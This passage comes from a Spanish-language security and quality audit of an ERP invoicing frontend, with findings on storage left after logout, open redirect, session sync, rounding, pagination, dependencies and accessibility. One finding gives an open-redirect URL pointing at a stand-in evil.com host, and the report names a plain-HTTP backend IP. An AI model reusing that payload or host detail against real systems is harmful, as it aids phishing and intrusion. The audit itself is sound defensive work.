   queries se cancelen al desmontar o al cambiar de filtros (FE-039).
4. Para las mutaciones financieras, combinar con **claves de idempotencia** (FE-033), de modo que un
   reintento tras timeout no pueda duplicar el documento.

#### Related Components

FE-033 (duplicados), FE-039 (cancelación), FE-020 (`KeepAlive` multiplica las peticiones vivas),
FE-031 (`retry: 1` duplica la carga durante incidentes).

---

### [FE-011] Datos locales persisten tras el cierre de sesión

**Severity:** HIGH
**Confidence:** Confirmed
**Category:** Privacy / Data Remanence
**Priority:** P1

#### Description

`clearSession()` elimina exactamente tres claves: token, tenant y usuario. **Todo lo demás persiste**, tanto
en `localStorage` como en `sessionStorage`, y queda disponible para el siguiente usuario del navegador.

Inventario de lo que sobrevive al logout:

| Clave / prefijo | Almacén | Contenido | Sensibilidad |
|---|---|---|---|
| `draft:*` | localStorage | Borradores completos de formularios (facturas, compras, gastos: clientes, importes, líneas) | **Alta** |
| `gensuite-tabs` | sessionStorage | Pestañas abiertas con **títulos que incluyen identificadores de documentos y nombres de clientes** | **Alta** |
| `cheque-bg:*` | localStorage | Imágenes de fondo de plantillas de cheque en base64 (hasta ~2 MB) | Media |
| `invoice-template-drafts` | localStorage | Borradores del editor de plantillas de factura | Media |
| `gensuite-multitab` | localStorage | Preferencia de multipestaña | Baja |
| `gensuite-theme` | localStorage | Tema claro/oscuro | Baja |

Los dos primeros son los relevantes. `useDraft` serializa **el estado completo del formulario** cada 30
segundos y en `beforeunload`, y `clearDraft()` solo se invoca cuando el documento se guarda con éxito. Un
formulario abandonado —o interrumpido por el 401 de FE-008— deja su borrador en `localStorage`
**indefinidamente**.

`TabsContext` persiste los títulos generados por `getTitleForPath`, que incorporan el identificador del
registro: `Cliente: Juan Pérez`, `Factura: ACC-SINV-2026-00042`, `Pago: PAY-00013`. Es una lista legible de
con quién y con qué documentos trabajó el usuario anterior.

#### Location

- `src/shared/api/storage.ts:107-111` — `clearSession()`, alcance limitado a 3 claves
- `src/hooks/useDraft.ts:11-17, 36-39` — escritura y limpieza de borradores
- `src/contexts/TabsContext.tsx:201, 213-217` — persistencia de pestañas
- `src/features/tesoreria/cheque-template-editor/backgroundImage.ts:23, 43, 52`
- `src/features/invoice-template-editor/drafts.ts:13, 27`

#### Evidence

```ts
// src/shared/api/storage.ts:107-111
export function clearSession(): void {
  clearToken()
  clearTenant()
  clearUser()
  // no toca draft:*, gensuite-tabs, cheque-bg:*, invoice-template-drafts
}
```

```ts
// src/hooks/useDraft.ts:11-17  — el estado completo del formulario, sin cifrar, sin caducidad
const save = useCallback(() => {
  if (!isNew) return
  try {
    localStorage.setItem(`${DRAFT_PREFIX}${key}`, JSON.stringify({ data: formState, savedAt: new Date().toISOString() }))
  } catch { /* quota exceeded */ }
}, [key, formState, isNew])
```

```ts
// src/contexts/TabsContext.tsx:43  — el título incorpora el identificador del registro
[/^\/clientes\/(.+)$/, (m) => `Cliente: ${m[1]}`],
```

#### Failure / Attack Scenario

1. Un vendedor empieza una factura para un cliente relevante: selecciona el cliente, añade 12 líneas con
   precios negociados y un descuento especial. A los 30 s, `useDraft` guarda todo en
   `localStorage['draft:invoice-new']`.
2. Le interrumpen. Cierra sesión sin guardar.
3. Otro empleado inicia sesión en el mismo equipo y abre `/facturas/nueva`.
4. `getDraft()` recupera el borrador y la UI ofrece restaurarlo: **cliente, líneas, precios negociados y
   descuento del vendedor anterior**, visibles para alguien que quizá no debería verlos.

Incluso sin restaurar, basta abrir DevTools → Application → Local Storage para leerlo todo. Y
`sessionStorage['gensuite-tabs']` revela la lista de clientes y documentos que el usuario anterior tenía
abiertos.

Como `localStorage` **no caduca y sobrevive al cierre del navegador**, estos datos permanecen en el equipo
indefinidamente.

#### Impact

Fuga de información comercial y financiera (precios negociados, descuentos, clientes, importes) entre
usuarios del mismo equipo. Retención indefinida de datos de negocio en equipos que pueden ser
compartidos, prestados o dados de baja.

#### Likelihood

**Media-Alta.** No requiere atacante: es el resultado del uso normal en un equipo compartido.

#### Recommendation

1. **Ampliar `clearSession()`** para eliminar todo el estado de datos: recorrer las claves de
   `localStorage` y `sessionStorage` y borrar las de prefijo `draft:`, `cheque-bg:`, `gensuite-tabs` e
   `invoice-template-drafts`. Conservar solo preferencias no sensibles (`gensuite-theme`,
   `gensuite-multitab`).
2. **Recarga dura en el logout** (`window.location.replace('/login')`), que además cierra FE-001 y FE-002.
3. **Espaciar los borradores por usuario**: incluir el email o el id de usuario en la clave
   (`draft:${userEmail}:${key}`), de forma que el borrador de otro usuario nunca sea recuperable aunque la
   limpieza falle.
4. **Caducar los borradores.** `useDraft` ya guarda `savedAt`; usarlo para descartar automáticamente
   cualquier borrador con más de 24-48 h.
5. Considerar no persistir en absoluto los campos más sensibles (precios negociados, descuentos), o
   guardar solo un subconjunto suficiente para reanudar.

#### Related Components

FE-001 (misma raíz), FE-008 (el 401 abandona formularios y deja borradores), `useDraft`, `TabsContext`.

---

## Medium Findings

### [FE-012] Identificadores sin codificar en las URLs de endpoint

**Severity:** MEDIUM · **Confidence:** Confirmed · **Category:** API Integration · **Priority:** P2

**Description.** `ENDPOINTS` construye 179 URLs por interpolación de plantilla, pero solo **73** aplican
`encodeURIComponent`. Las ~106 restantes insertan el identificador crudo. Los IDs de ERPNext son el campo
`name` del registro, que habitualmente contiene espacios, `/`, `&`, `#` o `?` (códigos de artículo tipo
`ITEM/2026/001`, nombres de cliente, cuentas contables como `Ventas - ABC / Sucursal`).

**Location.** `src/shared/api/endpoints.ts` — p. ej. líneas 11, 20-28, 33-40, 44-50, 55-57, 67, 74, 78, 82,
91, 95, 100, 105, 119, 124, 128, 140, 150, 158, 171.

**Evidence.**
```ts
// src/shared/api/endpoints.ts:20  — sin codificar
byId: (id: string) => `/invoices/${id}`,

// src/shared/api/endpoints.ts:15  — el patrón correcto, aplicado solo en algunos sitios
delete: (name: string) => `/customers/groups/${encodeURIComponent(name)}`,
```
La inconsistencia dentro del mismo archivo confirma que se conoce la técnica y se aplicó de forma parcial.

**Failure scenario.** Un artículo con código `ITEM/2026/001` produce `GET /catalog/items/ITEM/2026/001`:
el backend interpreta segmentos de ruta adicionales y responde 404. Peor, un `name` que contenga `?`
—`Servicio ¿Urgente?`— trunca la ruta y convierte el resto en query string, de modo que el BFF recibe una
petición semánticamente distinta a la pretendida. Un `#` trunca la URL en el cliente antes de enviarse.

Esto es principalmente un **defecto funcional**, no una vulnerabilidad: el atacante controlaría un ID que
el backend igual autorizará o rechazará. El riesgo de inyección de parámetros existe pero es limitado, ya
que los IDs provienen de registros que el usuario ya puede ver.

**Impact.** Registros inaccesibles desde la UI; errores 404 inexplicables; peticiones malformadas.

**Recommendation.** Aplicar `encodeURIComponent` a **todos** los interpolados de `endpoints.ts`. Es un
cambio mecánico y de bajo riesgo. Añadir un test que recorra el objeto `ENDPOINTS` invocando cada función
con un ID que contenga `/`, `?`, `#` y espacio, y verifique que el resultado no contiene esos caracteres
sin escapar. Verificar en paralelo que el BFF decodifica correctamente.

---

### [FE-013] Las respuestas de error de tipo `blob` eluden el interceptor

**Severity:** MEDIUM · **Confidence:** Confirmed · **Category:** Error Handling · **Priority:** P2

**Description.** Las descargas de PDF y Excel usan `responseType: 'blob'`. Cuando el servidor responde con
un error, axios entrega `error.response.data` como **`Blob`**, no como JSON. El interceptor asume JSON:
`data?.error?.code` es `undefined` sobre un `Blob`, de modo que la detección de `ERPNEXT_AUTH_ERROR`
**nunca se activa** para estas peticiones y el usuario recibe el mensaje genérico de axios
(`"Request failed with status code 500"`) en lugar del mensaje real del backend.

**Location.** `src/shared/api/client.ts:62-79`; consumidores: `src/shared/api/invoices.ts:110-135`,
`src/shared/api/cobros.ts:165-178`, `tesoreria.ts`, `reportes.ts`, `compras-gastos.ts` (~20 funciones de
descarga).

**Evidence.**
```ts
// src/shared/api/client.ts:62-71
const data = error.response.data as ApiErrorResponse   // en blob requests esto es un Blob
if (!isLoginRequest && data?.error?.code === 'ERPNEXT_AUTH_ERROR') { ... }  // nunca true
```

**Failure scenario.** Un usuario descarga el estado de cuenta de un cliente. El BFF no logra autenticarse
contra ERPNext y devuelve `ERPNEXT_AUTH_ERROR` con estado 500. Como la respuesta es un `Blob`, el
interceptor no detecta el código, no cierra la sesión y el usuario ve *"Request failed with status code
500"*, sin indicación de que su sesión es inválida. Seguirá encontrando el mismo error en cada intento.

**Impact.** Mensajes de error inútiles y estado de sesión inconsistente en todos los flujos de descarga.

**Recommendation.** En el interceptor, detectar `error.response.data instanceof Blob` y, si su `type` es
`application/json`, leerlo con `await blob.text()` + `JSON.parse` antes de aplicar la lógica de error
existente. El interceptor debe ser `async` para ello.

---

### [FE-014] Superficie de open redirect en el parámetro `next` del login

**Severity:** MEDIUM · **Confidence:** Probable · **Category:** Open Redirect · **Priority:** P2

**Description.** `LoginPage` lee `?next=` de la URL y navega a ese valor tras autenticar, **sin
validación**. Ningún punto de la aplicación escribe ese parámetro (`ProtectedRoute` y el interceptor
redirigen a `/login` sin él), por lo que hoy es exclusivamente controlable por un tercero.

**Location.** `src/pages/LoginPage.tsx:39` (lectura), `:72` (navegación).

**Evidence.**
```tsx
const next = params.get('next') ?? '/dashboard'
// ...
await authLogin(values.email, values.password, values.tenant)
navigate(next, { replace: true })      // sin validar
```

**Failure scenario.** Un atacante envía `https://app-legitima/login?next=//evil.com/fake-invoice`. La
víctima se autentica con normalidad y es redirigida. React Router v7 resuelve la cadena mediante
`history.pushState`; para un destino de otro origen el navegador lanza `SecurityError`, lo que **limita el
redirect externo** pero deja la app en un estado roto tras un login correcto. Un `next` interno malicioso
(`/config/ecf/admin`) sí funciona y puede usarse para dirigir a la víctima a una pantalla concreta como
parte de un pretexto de ingeniería social.

Se clasifica como **Probable** y no Confirmed porque la explotación como redirect *externo* depende del
comportamiento del navegador y de React Router, y en las versiones actuales queda bloqueada.

**Impact.** Estado roto tras el login; vector auxiliar de phishing. No permite robo directo de credenciales.

**Recommendation.** Validar antes de navegar: aceptar únicamente rutas internas (`next.startsWith('/') &&
!next.startsWith('//')`), y preferiblemente contrastar contra una lista de rutas conocidas. Al implementar
FE-008 (propagar el destino en `?next=`), esta validación pasa a ser obligatoria.

---

### [FE-015] Desincronización de sesión entre pestañas

**Severity:** MEDIUM · **Confidence:** Confirmed · **Category:** Session Management · **Priority:** P2

**Description.** `storage.ts` registra un listener del evento `storage` que actualiza su caché interna
cuando otra pestaña modifica las claves. Pero **solo actualiza el `Map` de caché**: no notifica al store de
Zustand ni a React. La pestaña B sigue renderizando la interfaz como autenticada después de que la pestaña
A haya cerrado sesión.

**Location.** `src/shared/api/storage.ts:51-57`; `src/stores/auth.store.ts` (sin suscripción a `storage`).

**Evidence.**
```ts
// src/shared/api/storage.ts:51-57
window.addEventListener('storage', (e) => {
  if (e.key?.startsWith('gensuite:')) {
    cache.set(e.key, e.newValue)      // actualiza la caché, pero nadie re-renderiza
  }
})
```

**Failure scenario.** El usuario tiene dos pestañas abiertas. Cierra sesión en la pestaña A. En la B sigue
viendo el dashboard con todos sus datos. Rellena una factura y pulsa "Guardar": `getToken()` devuelve
`null`, la petición sale sin `Authorization`, el backend responde 401 y el trabajo se pierde (FE-008).

Escenario inverso, más delicado: el usuario A cierra sesión en la pestaña 1 y el usuario B inicia sesión en
esa misma pestaña. La pestaña 2 conserva la UI de A **pero usa el token de B**: las peticiones se ejecutan
con la identidad de B mientras la pantalla muestra los datos de A.

**Impact.** Pérdida de trabajo; confusión de identidad entre pestañas; operaciones ejecutadas bajo un
usuario distinto al que la interfaz muestra.

**Recommendation.** En el listener de `storage`, cuando `TOKEN_KEY` pase a `null`, invocar
`useAuthStore.getState().logout()` y `queryClient.clear()`, y redirigir a `/login`. Cuando el token cambie a
un valor distinto, forzar `window.location.reload()` para re-hidratar toda la aplicación con la nueva
identidad. La API `BroadcastChannel` es una alternativa más explícita para coordinar sesión entre pestañas.

---

### [FE-016] Acumulación de error de punto flotante en los totales

**Severity:** MEDIUM · **Confidence:** Confirmed · **Category:** Financial · **Priority:** P2

**Description.** Los totales de documento se calculan con aritmética de coma flotante nativa, sumando con
`reduce` **sin redondear en ningún paso intermedio**. El proyecto dispone de un helper `round2()` en
`lib/formatters.ts` que no se aplica aquí.

**Location.** `src/features/invoicing/InvoiceForm.tsx:876-880`; patrón equivalente en `CompraForm`,
`GastoForm`, `QuotationForm`, `PedidoForm`, `lib/paymentLines.ts:47-49, 52-56, 58-63`.

**Evidence.**
```ts
// src/features/invoicing/InvoiceForm.tsx:876-880
const subtotal      = items.reduce((s, i) => s + i.amount, 0)
const grossTotal    = items.reduce((s, i) => s + i.qty * i.rate, 0)
const totalDiscount = grossTotal - subtotal
const taxTotal      = items.reduce((s, i) => s + (i.amount * i.salesTaxPct / 100), 0)  // sin redondeo por línea
const total         = subtotal + taxTotal
```

**Failure scenario.** Con 30 líneas y ITBIS del 18 %, el residuo de coma flotante se acumula y el total
mostrado puede diferir en 1-2 centavos del que calcula ERPNext (que redondea por línea). El usuario ve
`RD$45.230,17` en pantalla y `RD$45.230,15` en la factura guardada. En `paymentLines.ts`, la tolerancia
`PAYMENT_LINES_TOLERANCE = 0.01` absorbe el problema en la validación de pagos, pero un descuadre de 2
centavos **excede** esa tolerancia y bloquea el cobro con un mensaje que el cajero no puede resolver.

**Impact.** Discrepancias de céntimos entre pantalla y documento guardado; cobros bloqueados por
validaciones de tolerancia; pérdida de confianza del usuario en las cifras mostradas.

**Recommendation.** Redondear a 2 decimales **por línea** antes de acumular (`round2()` ya existe), y
redondear el resultado de cada agregado. Alinear la estrategia de redondeo con la de ERPNext —debe
confirmarse con el equipo de backend si redondea por línea o sobre el total. Para importes monetarios, la
alternativa robusta es trabajar en enteros de centavos. Elevar la tolerancia de pagos no es la solución:
enmascara el síntoma.

---

### [FE-017] `InvoicesPage` sin controles de paginación — registros inalcanzables

**Severity:** MEDIUM · **Confidence:** Confirmed · **Category:** Functional · **Priority:** P2

**Description.** El listado de facturas —la pantalla más consultada de un ERP de facturación— solicita
`limit: 50` fijo, **sin parámetro de página ni offset y sin controles de navegación**. Muestra el total real
(`Mostrando N de {meta.total}`) pero no ofrece forma de acceder a los registros más allá de los 50 primeros.

**Location.** `src/features/invoicing/InvoicesPage.tsx:81` (`limit: 50`), `:309-312` (contador sin controles).

**Evidence.**
```ts
// src/features/invoicing/InvoicesPage.tsx:81
limit: 50,
// no hay `page`, `offset`, `setPage` ni botones Anterior/Siguiente en el archivo
```
```tsx
// :309-312  — informa del total pero no permite alcanzarlo
{data?.meta && (
  <>Mostrando {invoices.length} de {data.meta.total} facturas</>
)}
```
Otras 20 páginas de listado **sí** implementan paginación (`CustomersPage`, `ComprasPage`, `ItemsPage`,
`CuentasPage`, `MovimientosBancoPage`…), lo que confirma que es una omisión y no una decisión de diseño.

**Failure scenario.** Un tenant con 5.000 facturas solo puede ver 50 a través de esta pantalla. Para
localizar una factura antigua debe conocer de antemano un filtro que la aísle. El contador *"Mostrando 50
de 5.000"* comunica explícitamente que faltan 4.950 registros inalcanzables.

**Impact.** Funcionalidad central inutilizable a escala real. El impacto crece con la antigüedad del tenant.

**Recommendation.** Añadir estado de página y controles, replicando el patrón ya presente en
`CustomersPage`. Verificar el resto de listados sin paginación. Importante: **al cambiar cualquier filtro,
reiniciar la página a 1**, o el usuario quedará en una página vacía tras filtrar.

---

### [FE-018] `limit: 100` fijo en los selectores — truncamiento silencioso

**Severity:** MEDIUM · **Confidence:** Confirmed · **Category:** Functional · **Priority:** P2

**Description.** Al menos 30 queries que alimentan desplegables usan `limit: 100` codificado. Si el tenant
supera los 100 registros, los excedentes **desaparecen del selector sin ningún aviso**.

**Location.** ~30 ocurrencias: `listSucursales({ limit: 100 })` (14 archivos), `listUsuarios({ limit: 100 })`
(`CustomerFormPanel.tsx:118`, `AjustesAvanzadosPage.tsx:109`), `listRetenciones({ limit: 100 })`,
`listItems({ limit: 100 })` (`PricingRulesPage.tsx:213`), `listTiposDocumento`, `listCentrosCosto`,
`listDepartamentos`, `listAttributes`, `listChequePrintTemplates`.

**Evidence.**
```ts
// src/features/catalog/PricingRulesPage.tsx:213  — el caso más grave: catálogo de artículos
queryFn: () => listItems({ limit: 100 }),
```

**Failure scenario.** El más severo es `listItems({ limit: 100 })`: un catálogo real supera con facilidad
los 100 artículos, de modo que al crear una regla de precio **la mayoría de los artículos no aparecen** y
el usuario concluye que no existen. Con `listUsuarios({ limit: 100 })`, una organización de más de 100
usuarios no puede asignar vendedor a partir del centésimo primero.

**Impact.** Registros no seleccionables sin ningún indicio de que están siendo omitidos. El fallo es
silencioso: no hay error, solo ausencia.

**Recommendation.** Sustituir los selectores por búsqueda contra el servidor (`search` como parámetro y
`useDebounce`, patrón ya presente en `SearchableSelect`), en lugar de precargar listas completas. Como
mínimo inmediato, mostrar un aviso cuando `meta.total > items.length` (*"Mostrando 100 de N — refina la
búsqueda"*), de forma que el truncamiento deje de ser invisible.

---

### [FE-019] Actualizador de estado impuro en `TabsContext`

**Severity:** MEDIUM · **Confidence:** Confirmed · **Category:** React Correctness · **Priority:** P2

**Description.** `setTabs` ejecuta un efecto secundario (`saveTabs` → `sessionStorage.setItem`) **dentro del
actualizador de `setState`**, y además invoca `setActiveId` desde ese mismo actualizador. React exige que
los actualizadores sean funciones puras; bajo `StrictMode` —activo en `main.tsx:22`— se invocan dos veces
en desarrollo, y el modo concurrente puede reejecutarlos o descartarlos.

**Location.** `src/contexts/TabsContext.tsx:240-246` (`setTabs`), `:260-270` (uso con `setActiveId` y
`makeId()` anidados).

**Evidence.**
```ts
// src/contexts/TabsContext.tsx:240-246
const setTabs = (updater: (prev: Tab[]) => Tab[]) => {
  setTabsRaw((prev) => {
    const next = updater(prev)
    saveTabs(next)        // efecto secundario dentro del actualizador
    return next
  })
}
```
```ts
// :260-270  — makeId() genera un id distinto en cada invocación del actualizador
setTabs((prev) => {
  const existing = prev.find((t) => t.path.split('?')[0] === pathname)
  if (existing) { const next = ...; setActiveId(existing.id); return next }   // setState anidado
  const newTab: Tab = { id: makeId(), path: fullPath, title: getTitleForPath(pathname), isDirty: false }
  setActiveId(newTab.id)   // setState anidado con un id que puede ser descartado
  return [...prev, newTab]
})
```

**Failure scenario.** Bajo `StrictMode`, React ejecuta el actualizador dos veces. `makeId()` —basado en
`Date.now()` y `Math.random()`— produce **dos identificadores distintos**. React conserva el resultado de
la segunda ejecución, pero `setActiveId` se ha invocado con ambos. Funciona hoy porque la última invocación
prevalece, pero es una dependencia frágil del orden de ejecución. `saveTabs` escribe además en
`sessionStorage` dos veces por navegación, incluida una escritura con un estado descartado.

**Impact.** Fragilidad ante cambios de React o activación de features concurrentes; escrituras redundantes
en `sessionStorage`; riesgo de desincronización entre `activeId` y la pestaña realmente activa.

**Recommendation.** Mantener el actualizador puro: devolver solo el nuevo estado. Mover la persistencia a un
`useEffect` que observe `tabs` (`useEffect(() => saveTabs(tabs), [tabs])`) y derivar `activeId` del estado
en lugar de fijarlo desde dentro del actualizador —por ejemplo, calculándolo con `useMemo` a partir de
`tabs` y `location.pathname`, eliminando así un estado duplicado.

---

### [FE-020] `KeepAlive max={15}` mantiene 15 vistas montadas con temporizadores activos

**Severity:** MEDIUM · **Confidence:** Confirmed · **Category:** Performance / Memory · **Priority:** P2

**Description.** El sistema de multipestañas usa `<KeepAlive max={15}>`, que conserva hasta 15 páginas
**montadas** simultáneamente. Sus `useEffect`, temporizadores, listeners y observadores de React Query
siguen activos en segundo plano.

**Location.** `src/components/layout/AppLayout.tsx:1362-1368`.

**Evidence.**
```tsx
<KeepAlive activeCacheKey={activeTabPath} max={15} aliveRef={keepAliveRef}>
  {outlet}
</KeepAlive>
```
Trabajo en segundo plano que permanece vivo:
- `CajaPage.tsx:90-97` y `PorCobrarPage.tsx:96-105`: `setInterval` de 60 s recalculando el vencimiento del turno.
- `useDraft.ts:19-23`: `setInterval` de 30 s serializando el formulario completo a `localStorage`.
- Observadores de React Query de cada página, que refetchean al expirar `staleTime`.
- Listeners globales de `AppLayout` y `useFloatingPortal` (`scroll` en captura, `resize`).

**Failure scenario.** Un usuario abre 15 pestañas a lo largo de la jornada. En segundo plano se ejecutan
varios `setInterval`, se serializan borradores completos cada 30 s por cada formulario abierto, y decenas de
queries revalidan periódicamente. Sobre una conexión lenta esto compite con la petición que el usuario
realmente está esperando. Si el backend está lento (FE-010), las 15 vistas acumulan peticiones colgadas
hasta agotar el límite de 6 conexiones concurrentes por origen.

**Impact.** Consumo sostenido de memoria y CPU; peticiones de red innecesarias; contención del pool de
conexiones; escrituras continuas en `localStorage`.

**Recommendation.** Reducir `max` a un valor más conservador (5-8). Suspender el trabajo en segundo plano en
las vistas inactivas: `keepalive-for-react` expone hooks de activación/desactivación que permiten pausar
intervalos y queries. Como mínimo, condicionar los `setInterval` de turno y de borrador a que la pestaña
esté activa, y usar `document.visibilityState` para pausar cuando la ventana no es visible.

---

### [FE-021] El build de producción fija `/api/v1` sin proxy garantizado

**Severity:** MEDIUM · **Confidence:** Confirmed · **Category:** Deployment Configuration · **Priority:** P1

**Description.** `VITE_API_BASE_URL=/api/v1` es una ruta **relativa** que funciona en desarrollo gracias al
proxy del dev server de Vite. Ese proxy **solo existe en `vite dev` y `vite preview`**. En un despliegue
estático real (Nginx, S3+CloudFront, Netlify) no hay proxy: todas las peticiones irían al mismo origen del
frontend y devolverían 404 o el `index.html`.

El `dist/` presente en el repositorio confirma que el valor quedó incrustado: la búsqueda del bundle
compilado solo encuentra `/api/v1`, sin ningún host absoluto.

**Location.** `.env:3`, `src/shared/api/client.ts:8`, `src/lib/constants.ts:104`, `vite.config.ts:16-45`.

**Evidence.**
```
grep -roh "207\.180\.235\.134|/api/v1|gensapi" dist/assets/
  → /api/v1        (única coincidencia; no hay host absoluto)
```
```ts
// vite.config.ts — el proxy existe solo en `server` y `preview`, nunca en el artefacto estático
server:  { proxy: { "/api": { target: apiTarget, changeOrigin: true, secure: false } } },
preview: { proxy: { "/api": { target: apiTarget, changeOrigin: true, secure: false } } },
```
No existe `.env.production`, por lo que `npm run build` toma el `.env` de desarrollo.

**Failure scenario.** Se despliega `dist/` en un hosting estático sin reverse proxy configurado. **La
aplicación no funciona en absoluto**: cada petición a `/api/v1/...` devuelve el `index.html` del SPA, axios
intenta parsearlo como JSON y falla. El síntoma —errores de parseo en todas las pantallas— no apunta a la
causa.

Riesgo asociado: el backend es **HTTP plano** (`http://207.180.235.134:4000`). Si el frontend se sirve por
HTTPS y alguien "corrige" el problema apuntando `VITE_API_BASE_URL` directamente a esa URL, el navegador
bloqueará las peticiones por Mixed Content —el problema que el proxy pretendía resolver—. La solución
correcta es TLS en el backend o un reverse proxy en producción.

**Impact.** Fallo total de la aplicación en un despliegue estático mal configurado; dependencia no
documentada de infraestructura externa.

**Recommendation.** Documentar explícitamente que el despliegue **requiere** un reverse proxy que enrute
`/api` al BFF, e incluir la configuración de referencia (`location /api { proxy_pass ...; }`) en el README.
Alternativamente, definir `.env.production` con la URL absoluta del backend **por HTTPS**. Prioritario:
habilitar TLS en el BFF; hoy los tokens JWT viajan en claro entre proxy y backend.

---

### [FE-022] `console.log` con datos de negocio llega al bundle de producción

**Severity:** MEDIUM · **Confidence:** Confirmed · **Category:** Information Disclosure · **Priority:** P2

**Description.** `PricingRulesPage` conserva 9 `console.log` de depuración que vuelcan payloads completos.
Vite/esbuild **no elimina `console.log` por defecto**, y su presencia en el chunk compilado lo confirma.

**Location.** `src/features/catalog/PricingRulesPage.tsx:298, 302, 307, 356, 357, 358, 374, 376, 379`.
Verificado en `dist/assets/PricingRulesPage-gfMxE2HX.js`.

**Evidence.**
```ts
console.log('onSubmit called', values)
console.log('payload:', payload)
console.log('toggleMutation onError:', err)
```
```
grep -c "console.log" dist/assets/PricingRulesPage-*.js  → 1  (presente tras el build)
```

**Impact.** Divulgación de estructura interna de payloads y datos de reglas de precio en la consola del
navegador; ruido que dificulta el diagnóstico real. Bajo por sí solo, pero es exactamente la información
que facilita a un atacante construir peticiones válidas contra el BFF.

**Recommendation.** Eliminar los `console.log` de depuración. Configurar `esbuild: { drop: ['console',
'debugger'] }` en `vite.config.ts` para producción, de modo que futuros olvidos no lleguen al bundle.
Activar la regla `no-console` de ESLint con excepción para `console.error`.

---

### [FE-023] Vulnerabilidades conocidas en dependencias

**Severity:** MEDIUM · **Confidence:** Confirmed · **Category:** Dependencies · **Priority:** P2

**Description.** `npm audit` reporta **7 vulnerabilidades (4 high, 3 moderate)**.

| Paquete | Severidad | Advisory | Relevancia real |
|---|---|---|---|
| `react-router` 7.12.0-7.18.1 | High | GHSA-qwww-vcr4-c8h2 — CSRF bypass en modo RSC | **Baja**: el proyecto no usa RSC (SPA con `BrowserRouter`) |
| `brace-expansion` <5.0.9 | High (×2) | GHSA-mh99-v99m-4gvg, GHSA-rgw5-rvv9-x895 — DoS | **Nula en runtime**: dependencia transitiva de tooling |
| `postcss` | Moderate | GHSA-fxqj-rqcc-2cmp — lectura de `.map` arbitrarios | **Baja**: solo en build |
| `uuid` <11.1.1 (vía `exceljs`) | Moderate | GHSA-w5hq-g745-h8pq — falta de bounds check | **Baja**: `exceljs` se usa para exportar |

Ninguna es explotable de forma directa en este contexto, pero `react-router` y `exceljs` **sí** están en el
runtime del cliente.

**Evidence.** `npm audit` → `7 vulnerabilities (3 moderate, 4 high)`. `npm outdated` muestra además ~20
paquetes desactualizados (Radix UI, TanStack Query 5.101→5.102.8).

**Recommendation.** Ejecutar `npm audit fix` (no requiere cambios incompatibles para `react-router`,
`postcss` y `brace-expansion`). **No** aplicar `--force`: degradaría `exceljs` a 3.4.0, un cambio
incompatible; evaluar la actualización de `exceljs` por separado. Establecer una revisión periódica de
dependencias e integrar `npm audit` en el CI cuando exista (FE-026).

---

### [FE-024] Modales sin trampa de foco ni restauración

**Severity:** MEDIUM · **Confidence:** Confirmed · **Category:** Accessibility · **Priority:** P2

**Description.** El componente `Modal` compartido implementa cierre con `Escape` y `aria-modal`, pero
carece de trampa de foco, no mueve el foco al abrirse y no lo restaura al cerrarse. El contenido de fondo
permanece navegable por teclado y expuesto a lectores de pantalla. Además `role="dialog"` está aplicado al
**overlay** —el elemento que captura el clic de cierre— y no al contenedor del diálogo.

**Location.** `src/shared/ui/Modal.tsx:16-44`. Otros modales (`PinModal`, `PdfPreviewModal`,
`GenerateConfirmModal`) construyen su propio markup sin siquiera `role="dialog"`.

**Evidence.**
```tsx
// src/shared/ui/Modal.tsx:29-30
<div className="modal-overlay" onClick={onClose} role="dialog" aria-modal="true" aria-label={title}>
  <div className={`modal-box ${sizeClass}`} onClick={(e) => e.stopPropagation()}>
```
Sin `useRef` al contenedor, sin `focus()` inicial, sin gestión de `Tab`/`Shift+Tab`, sin restauración del
foco previo.

**Failure scenario.** Un usuario de teclado abre el modal de confirmación de cobro. El foco permanece en el
botón que lo abrió, detrás del overlay. Al tabular, recorre los elementos de la página de fondo —invisibles
bajo el overlay— sin llegar nunca a los botones del modal. Un usuario de lector de pantalla escucha el
contenido de fondo como si el modal no existiera.

**Impact.** Los flujos con modal (cobro, autorización por PIN, confirmación de anulación) son
inaccesibles por teclado y lector de pantalla. Afecta a operaciones financieras irreversibles.

**Recommendation.** Implementar trampa de foco en `Modal`: enfocar el primer elemento interactivo al abrir,
ciclar `Tab` dentro del contenedor, restaurar el foco al cerrar, y aplicar `role="dialog"` al `modal-box`
en lugar de al overlay. Dado que **Radix UI ya es dependencia** y `@radix-ui/react-dialog` está instalado y
resuelve todo esto correctamente, migrar `Modal` a Radix es la opción de menor coste y mayor calidad.
Unificar después los modales ad-hoc sobre ese componente.

---

### [FE-025] Elementos interactivos no accesibles por teclado; imágenes sin texto alternativo

**Severity:** MEDIUM · **Confidence:** Confirmed · **Category:** Accessibility · **Priority:** P3

**Description.** Hay **266** `<div onClick={...}>` sin `role`, sin `tabIndex` y sin manejador de teclado: no
son alcanzables por `Tab` ni activables con Enter/Espacio, y los lectores de pantalla no los anuncian como
interactivos. Además, de 6 `<img>` solo 3 tienen `alt`.

La cobertura de ARIA es escasa en relación al tamaño del proyecto: 41 `aria-label` y 29 `role=` para ~150
pantallas.

**Location.** 266 ocurrencias distribuidas por `src/features/`; `<img>` sin `alt` en `src/components/` y
`src/features/`.

**Failure scenario.** Filas de tabla clicables, tarjetas de selección y elementos de menú implementados como
`<div onClick>` resultan inalcanzables sin ratón. Un usuario que navega por teclado no puede abrir el
detalle de una factura desde el listado si la fila es un `div`.

**Impact.** Barreras de accesibilidad en flujos principales; posible incumplimiento de requisitos de
accesibilidad si el sistema se comercializa a entidades sujetas a ellos.

**Recommendation.** Sustituir por `<button>` con estilo, que aporta semántica y teclado sin trabajo extra.
Donde no sea viable, añadir `role="button"`, `tabIndex={0}` y `onKeyDown` para Enter/Espacio. Añadir `alt`
a todas las imágenes (`alt=""` si son decorativas). Incorporar `eslint-plugin-jsx-a11y` para detectar estos
casos automáticamente; con 266 ocurrencias conviene introducirlo como advertencia y reducirlas por fases.

---

## Low Findings

### [FE-026] Cero tests y cero CI/CD

**Severity:** LOW (impacto ALTO, clasificado como Low por no ser una vulnerabilidad) · **Confidence:** Confirmed · **Category:** Testing · **Priority:** P1

No existe **ningún** archivo de test (`*.test.*`, `*.spec.*`), ninguna configuración de test (Vitest, Jest)
ni ningún pipeline (`.github/` no existe). En una aplicación de 85.000 líneas que emite facturas fiscales y
registra pagos, esto significa que **ninguna regresión se detecta automáticamente**.

Flujos críticos sin cobertura alguna: login/logout, expiración de sesión, 401/403, cálculo de totales e
impuestos, validación de NCF/RNC/Cédula, cobros y pagos, conciliación de e-CF, cambio de usuario,
concurrencia, backend caído, respuestas malformadas de ERPNext, y —de forma especialmente relevante— el
manejo de fechas y zona horaria (FE-007) y la limpieza de sesión (FE-001).

